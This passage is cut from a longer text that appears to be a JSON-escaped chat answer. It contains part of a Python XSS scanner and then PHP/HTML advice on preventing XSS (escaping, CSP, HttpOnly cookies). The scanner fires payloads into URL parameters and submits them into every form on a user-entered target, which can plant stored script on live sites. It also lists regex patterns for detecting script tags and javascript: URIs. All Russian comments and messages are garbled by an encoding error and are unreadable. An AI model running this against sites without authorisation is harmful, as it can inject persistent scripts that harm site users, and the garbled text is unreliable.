–¢–µ—Å—Ç–∏—Ä—É–µ–º Reflected XSS: {url}\")\n        \n        for payload in self.XSS_PAYLOADS:\n            test_params = params.copy()\n            \n            # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∫–∞–∂–¥—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä\n            for param in test_params:\n                test_params[param] = payload\n                \n                try:\n                    response = self.session.get(url, params=test_params, timeout=10)\n                    \n                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ payload –≤ –æ—Ç–≤–µ—Ç–µ\n                    if payload in response.text:\n                        vulnerability = {\n                            'type': 'Reflected XSS',\n                            'url': url,\n                            'parameter': param,\n                            'payload': payload,\n                            'severity': 'High'\n                        }\n                        \n                        self.vulnerabilities.append(vulnerability)\n                        print(f\"[!] –ù–ê–ô–î–ï–ù–ê REFLECTED XSS: {param} = {payload[:50]}...\")\n                        \n                        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å –ø–æ–∏—Å–∫–æ–º —Å–∫—Ä–∏–ø—Ç–æ–≤\n                        if self.is_xss_executable(response.text, payload):\n                            vulnerability['severity'] = 'Critical'\n                            print(f\"[!!] XSS –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω!\")\n                \n                except Exception as e:\n                    print(f\"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ {param}: {e}\")\n                \n                # –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏—Å—Ö–æ–¥–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã\n                test_params = params.copy()\n                time.sleep(0.1)  # –ü–∞—É–∑–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏\n    \n    def test_stored_xss(self, form_url, form_data):\n        \"\"\"\n        –¢–µ—Å—Ç–∏—Ä—É–µ—Ç stored XSS —á–µ—Ä–µ–∑ —Ñ–æ—Ä–º—ã\n        \"\"\"\n        print(f\"[*] –¢–µ—Å—Ç–∏—Ä—É–µ–º Stored XSS: {form_url}\")\n        \n        for form in form_data:\n            if not form['inputs']:\n                continue\n            \n            action_url = urllib.parse.urljoin(form_url, form['action'])\n            \n            for payload in self.XSS_PAYLOADS[:5]:  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª—è Stored XSS\n                data = {}\n                \n                # –ó–∞–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –ø–æ–ª—è —Ñ–æ—Ä–º—ã\n                for input_field in form['inputs']:\n                    if input_field['name']:\n                        data[input_field['name']] = payload\n                \n                try:\n                    if form['method'] == 'POST':\n                        response = self.session.post(action_url, data=data, timeout=10)\n                    else:\n                        response = self.session.get(action_url, params=data, timeout=10)\n                    \n                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏\n                    if payload in response.text:\n                        vulnerability = {\n                            'type': 'Stored XSS',\n                            'url': action_url,\n                            'form_data': data,\n                            'payload': payload,\n                            'severity': 'Critical'\n                        }\n                        \n                        self.vulnerabilities.append(vulnerability)\n                        print(f\"[!!] –ù–ê–ô–î–ï–ù–ê STORED XSS: {payload[:50]}...\")\n                \n                except Exception as e:\n                    print(f\"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–æ—Ä–º—ã: {e}\")\n                \n                time.sleep(0.5)  # –ë–æ–ª—å—à–∞—è –ø–∞—É–∑–∞ –¥–ª—è Stored XSS\n    \n    def is_xss_executable(self, html_content, payload):\n        \"\"\"\n        –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –º–æ–∂–µ—Ç –ª–∏ XSS payload –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω\n        \"\"\"\n        # –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Ç–µ–≥–æ–≤\n        dangerous_patterns = [\n            r'<script[^>]*>.*?</script>',\n            r'<[^>]+on\\w+\\s*=',\n            r'javascript:',\n            r'vbscript:'\n        ]\n        \n        for pattern in dangerous_patterns:\n            if re.search(pattern, html_content, re.IGNORECASE | re.DOTALL):\n                return True\n        \n        return False\n    \n    def scan(self, target_urls=None, test_params=None):\n        \"\"\"\n        –ó–∞–ø—É—Å–∫–∞–µ—Ç –ø–æ–ª–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ XSS\n        \"\"\"\n        print(\"[*] –ù–∞—á–∏–Ω–∞–µ–º XSS —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...\")\n        print(f\"[*] –ë–∞–∑–æ–≤—ã–π URL: {self.base_url}\")\n        print(\"-\" * 50)\n        \n        urls_to_test = target_urls or [self.base_url]\n        \n        for url in urls_to_test:\n            print(f\"\\n[*] –°–∫–∞–Ω–∏—Ä—É–µ–º: {url}\")\n            \n            # –¢–µ—Å—Ç–∏—Ä—É–µ–º Reflected XSS\n            if test_params:\n                self.test_reflected_xss(url, test_params)\n            \n            # –ò—â–µ–º –∏ —Ç–µ—Å—Ç–∏—Ä—É–µ–º —Ñ–æ—Ä–º—ã –¥–ª—è Stored XSS\n            forms = self.find_forms(url)\n            if forms:\n                print(f\"[*] –ù–∞–π–¥–µ–Ω–æ —Ñ–æ—Ä–º: {len(forms)}\")\n                self.test_stored_xss(url, forms)\n        \n        # –í—ã–≤–æ–¥–∏–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã\n        self.print_results()\n        \n        return self.vulnerabilities\n    \n    def print_results(self):\n        \"\"\"\n        –í—ã–≤–æ–¥–∏—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è\n        \"\"\"\n        print(\"\\n\" + \"=\"*60)\n        print(\"                –†–ï–ó–£–õ–¨–¢–ê–¢–´ XSS –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø\")\n        print(\"=\"*60)\n        \n        if not self.vulnerabilities:\n            print(\"[+] XSS —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã\")\n            return\n        \n        print(f\"[!] –ù–∞–π–¥–µ–Ω–æ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {len(self.vulnerabilities)}\")\n        \n        for i, vuln in enumerate(self.vulnerabilities, 1):\n            print(f\"\\n[{i}] {vuln['type']} - {vuln['severity']}\")\n            print(f\"    URL: {vuln['url']}\")\n            \n            if 'parameter' in vuln:\n                print(f\"    –ü–∞—Ä–∞–º–µ—Ç—Ä: {vuln['parameter']}\")\n            \n            print(f\"    Payload: {vuln['payload'][:100]}...\")\n\ndef main():\n    # –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï –û –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò\n    print(\"\" + \"=\"*70)\n    print(\"    üö® –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï: –¢–û–õ–¨–ö–û –î–õ–Ø –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–´–• –¶–ï–õ–ï–ô! üö®\")\n    print(\"    ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö!\")\n    print(\"    ‚úÖ –ü–æ–ª—É—á–∏—Ç–µ –ø–∏—Å—å–º–µ–Ω–Ω–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º!\")\n    print(\"    ‚ùå –õ—é–±–æ–µ –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∑–∞–ø—Ä–µ—â–µ–Ω–æ!\")\n    print(\"=\"*70 + \"\\n\")\n    \n    # –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è\n    target_url = input(\"–í–≤–µ–¥–∏—Ç–µ URL –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: \")\n    \n    if not target_url.startswith(('http://', 'https://')):\n        target_url = 'http://' + target_url\n    \n    scanner = XSSScanner(target_url)\n    \n    # –ë–∞–∑–æ–≤—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è\n    test_params = {\n        'search': 'test',\n        'q': 'test',\n        'query': 'test',\n        'name': 'test',\n        'comment': 'test'\n    }\n    \n    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ\n    scanner.scan(test_params=test_params)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## üõ°Ô∏è –ú–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã –æ—Ç XSS:\n\n### 1. –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö\n```php\n// –ü—Ä–∏–º–µ—Ä –¥–ª—è PHP\n$input = filter_input(INPUT_POST, 'comment', FILTER_SANITIZE_SPECIAL_CHARS);\n```\n\n### 2. –≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—ã–≤–æ–¥–∞\n```php\n// –í—Å–µ–≥–¥–∞ —ç–∫—Ä–∞–Ω–∏—Ä—É–π—Ç–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ\necho htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');\n```\n\n### 3. Content Security Policy (CSP)\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'\">\n```\n\n### 4. HttpOnly cookies\n```php\nsetcookie('session', $value, 0, '/', '', true, true); // HttpOnly = true\n```"} 